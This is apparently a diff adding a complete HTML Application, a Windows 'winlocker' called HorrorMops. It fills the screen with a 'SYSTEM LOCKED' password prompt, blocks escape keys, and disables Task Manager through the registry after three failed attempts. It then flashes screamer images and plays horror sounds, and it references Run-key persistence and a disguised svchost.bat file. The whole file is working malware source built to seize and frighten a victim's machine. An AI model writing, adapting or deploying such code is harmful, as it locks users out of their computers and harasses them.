@@ -1,0 +1,313 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HTA:APPLICATION
+  ID="HorrorMops"
+  BORDER="none"
+  CAPTION="no"
+  SHOWINTASKBAR="no"
+  SINGLEINSTANCE="yes"
+  SYSMENU="no"
+  WINDOWSTATE="maximize"
+  SCROLL="no"
+  INNERBORDER="no"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  CONTEXTMENU="no"
+  SELECTION="no"
+/>
+<title>SYSTEM LOCKED</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body {
+  overflow: hidden;
+  background: #0a0514;
+  color: #dcdcdc;
+  font-family: 'Segoe UI', Arial, sans-serif;
+  height: 100%;
+  width: 100%;
+}
+.wrap {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+h1 {
+  color: #dc1e3c;
+  font-size: 64px;
+  margin-bottom: 16px;
+  letter-spacing: 6px;
+  text-align: center;
+  font-weight: bold;
+}
+.sub {
+  font-size: 18px;
+  color: #9a9ab0;
+  margin-bottom: 36px;
+  text-align: center;
+}
+.card {
+  background: #12121c;
+  border: 1px solid #2a2a3a;
+  border-radius: 14px;
+  padding: 34px 40px;
+  width: 520px;
+}
+.lbl {
+  font-size: 14px;
+  color: #888;
+  margin-bottom: 10px;
+  letter-spacing: 2px;
+}
+.inputrow {
+  position: relative;
+  width: 100%;
+}
+input {
+  width: 100%;
+  padding: 14px 70px 14px 18px;
+  font-size: 20px;
+  text-align: center;
+  background: #08080f;
+  color: #50dc78;
+  border: 2px solid #2a2a3a;
+  border-radius: 8px;
+  outline: none;
+  font-family: Consolas, monospace;
+}
+input:focus { border-color: #50dc78; }
+.eye {
+  position: absolute;
+  right: 16px;
+  top: 16px;
+  cursor: pointer;
+  font-size: 16px;
+  color: #888;
+  font-weight: bold;
+  font-family: Consolas, monospace;
+  user-select: none;
+}
+.eye:hover { color: #50dc78; }
+.btn {
+  margin-top: 22px;
+  padding: 14px 60px;
+  font-size: 18px;
+  font-weight: bold;
+  color: #0a0514;
+  background: #50dc78;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  width: 100%;
+}
+.btn:hover { background: #70ec98; }
+.attempts {
+  margin-top: 16px;
+  font-size: 14px;
+  color: #666;
+  text-align: center;
+}
+.err {
+  color: #ff4040;
+  margin-top: 10px;
+  font-size: 15px;
+  min-height: 22px;
+  text-align: center;
+}
+.timer {
+  font-size: 120px;
+  color: #ff2040;
+  font-weight: bold;
+  letter-spacing: 8px;
+  text-align: center;
+  font-family: Consolas, monospace;
+}
+.scream-img {
+  position: fixed;
+  z-index: 9999;
+  pointer-events: none;
+}
+</style>
+<script language="JScript">
+var PASSWORD = "Swinobaseyoudevwinlok";
+var attempts = 0;
+var MAX_ATTEMPTS = 3;
+var horrorActive = false;
+var timerInterval = null;
+var remaining = 180;
+var sndLast = null;
+
+var SCREAMS = [
+"https://i.pinimg.com/236x/98/61/68/986168d6f3b33382dd267a964edc98f1.jpg",
+"https://i.pinimg.com/236x/5a/2c/07/5a2c078d139053df31a479fe5c49cbcb.jpg",
+"https://i.pinimg.com/236x/7f/25/e9/7f25e9fc204418f81d33ff17808716b1.jpg",
+"https://i.pinimg.com/236x/0a/29/4e/0a294ed9696b9716f248ed5c1947ebc5.jpg",
+"https://i.pinimg.com/236x/9b/29/de/9b29defd4ecf15a5c8d583ee7e6a4df4.jpg",
+"https://i.pinimg.com/236x/13/39/2f/13392f0c3bbdc921f02e78ee36be67a8.jpg",
+"https://i.pinimg.com/236x/cd/20/a7/cd20a74f060b65ac41532a5bd88e7518.jpg",
+"https://i.pinimg.com/236x/66/86/05/668605a78983e588d86b76db97217718.jpg",
+"https://i.pinimg.com/236x/33/c8/ea/33c8ea265203b9fae3ef0db0da11cec4.jpg",
+"https://i.pinimg.com/236x/55/c5/db/55c5dbf8ea7aae8705bde66717ae589a.jpg"
+];
+
+var SND_HORROR = "https://www.myinstants.com/media/sounds/horror-scream-high-quality.mp3";
+var SND_BOX    = "https://www.myinstants.com/media/sounds/fnaf-1-music-box.mp3";
+var SND_LAST   = "https://www.myinstants.com/media/sounds/untitled-x.mp3";
+
+function toggleEye() {
+  var i = document.getElementById("pwd");
+  var e = document.getElementById("eye");
+  if (i.type == "password") { i.type = "text"; e.innerText = "[x]"; }
+  else { i.type = "password"; e.innerText = "[o]"; }
+  i.focus();
+}
+
+function showErr(msg) {
+  document.getElementById("err").innerText = msg;
+}
+
+function checkPass() {
+  var v = document.getElementById("pwd").value;
+  if (v == PASSWORD) {
+    showErr("OK. Unlocking...");
+    try {
+      var sh = new ActiveXObject("WScript.Shell");
+      sh.Run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinLockSvc /f', 0, true);
+      var fso = new ActiveXObject("Scripting.FileSystemObject");
+      try { fso.DeleteFile(sh.ExpandEnvironmentStrings("%APPDATA%") + "\\HorrorMops\\locker.hta", true); } catch(e) {}
+      try { fso.DeleteFile(sh.ExpandEnvironmentStrings("%APPDATA%") + "\\HorrorMops\\svchost.bat", true); } catch(e) {}
+    } catch(e) {}
+    setTimeout(function(){ window.close(); }, 700);
+  } else {
+    attempts++;
+    var left = MAX_ATTEMPTS - attempts;
+    document.getElementById("attempts").innerText = "Attempts: " + attempts + " / " + MAX_ATTEMPTS;
+    document.getElementById("pwd").value = "";
+    if (left > 0) {
+      showErr("Wrong password. Attempts left: " + left);
+      document.getElementById("pwd").focus();
+    } else {
+      showErr("Too many attempts.");
+      startHorrorMode();
+    }
+  }
+}
+
+function startHorrorMode() {
+  if (horrorActive) return;
+  horrorActive = true;
+  try { sndLast = new Audio(SND_LAST); sndLast.loop = true; sndLast.play(); } catch(e) {}
+  document.getElementById("card").style.display = "none";
+  document.getElementById("hdr").innerText = "TOO MANY ATTEMPTS";
+  document.getElementById("sub").innerText = "Horror mode active for 3:00";
+  document.getElementById("timerbox").style.display = "block";
+  try {
+    var sh = new ActiveXObject("WScript.Shell");
+    sh.Run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', 0, true);
+  } catch(e) {}
+  setInterval(function(){ document.body.style.background = (Math.random() > .5) ? "#000000" : "#5a0000"; }, 250);
+  spawnScreamer();
+  setInterval(function(){ spawnScreamer(); }, 1800);
+  remaining = 180;
+  updateTimer();
+  timerInterval = setInterval(tickTimer, 1000);
+}
+
+function updateTimer() {
+  var m = Math.floor(remaining / 60);
+  var s = remaining % 60;
+  var ss = (s < 10 ? "0" : "") + s;
+  document.getElementById("timer").innerText = m + ":" + ss;
+}
+
+function tickTimer() {
+  remaining--;
+  if (remaining < 0) {
+    clearInterval(timerInterval);
+    exitHorror();
+    return;
+  }
+  updateTimer();
+  if (remaining <= 179 && remaining >= 120) {
+    if (remaining % 7 == 0) {
+      try { var b = new Audio(SND_BOX); b.play(); } catch(e) {}
+    }
+  }
+  if (remaining == 60) {
+    try { var h = new Audio(SND_HORROR); h.play(); } catch(e) {}
+  }
+}
+
+function spawnScreamer() {
+  try {
+    var img = document.createElement("img");
+    img.className = "scream-img";
+    img.src = SCREAMS[Math.floor(Math.random() * SCREAMS.length)];
+    img.style.left = (Math.random() * (window.innerWidth - 300)) + "px";
+    img.style.top = (Math.random() * (window.innerHeight - 300)) + "px";
+    img.style.width = (200 + Math.random() * 200) + "px";
+    document.body.appendChild(img);
+    setTimeout(function(){ try { img.parentNode.removeChild(img); } catch(e) {} }, 1000 + Math.random() * 1500);
+  } catch(e) {}
+}
+
+function exitHorror() {
+  try {
+    var sh = new ActiveXObject("WScript.Shell");
+    sh.Run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f', 0, true);
+    sh.Run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinLockSvc /f', 0, true);
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    try { fso.DeleteFile(sh.ExpandEnvironmentStrings("%APPDATA%") + "\\HorrorMops\\locker.hta", true); } catch(e) {}
+    try { fso.DeleteFile(sh.ExpandEnvironmentStrings("%APPDATA%") + "\\HorrorMops\\svchost.bat", true); } catch(e) {}
+  } catch(e) {}
+  try { if (sndLast) sndLast.pause(); } catch(e) {}
+  window.close();
+}
+
+function lockKeys(e) {
+  e = e || window.event;
+  var k = e.keyCode || e.which;
+  if (k == 115 || k == 27 || k == 9 || k == 91 || k == 92 || k == 122) {
+    e.returnValue = false;
+    return false;
+  }
+  if (e.ctrlKey && (k == 87 || k == 82 || k == 78)) {
+    e.returnValue = false;
+    return false;
+  }
+}
+
+window.onload = function() {
+  document.onkeydown = lockKeys;
+  document.getElementById("pwd").focus();
+  setInterval(function(){
+    try { window.moveTo(0,0); window.resizeTo(screen.width, screen.height); } catch(e){}
+  }, 800);
+};
+document.oncontextmenu = function(){ return false; };
+document.onselectstart = function(){ return false; };
+</script>
+</head>
+<body>
+<div class="wrap">
+  <h1 id="hdr">SYSTEM LOCKED</h1>
+  <div class="sub" id="sub">Enter the password to unlock this session</div>
+  <div class="card" id="card">
+    <div class="lbl">PASSWORD</div>
+    <div class="inputrow">
+      <input type="password" id="pwd" autocomplete="off" onkeydown="if(event.keyCode==13)checkPass();" />
+      <span class="eye" id="eye" onclick="toggleEye();">[o]</span>
+    </div>
+    <button class="btn" onclick="checkPass();">CONFIRM</button>
+    <div class="attempts" id="attempts">Attempts: 0 / 3</div>
+    <div class="err" id="err"></div>
+  </div>
+  <div id="timerbox" style="display:none;text-align:center;margin-top:20px;">
+    <div class="timer" id="timer">3:00</div>
+  </div>
+</div>
+</body>
+</html>
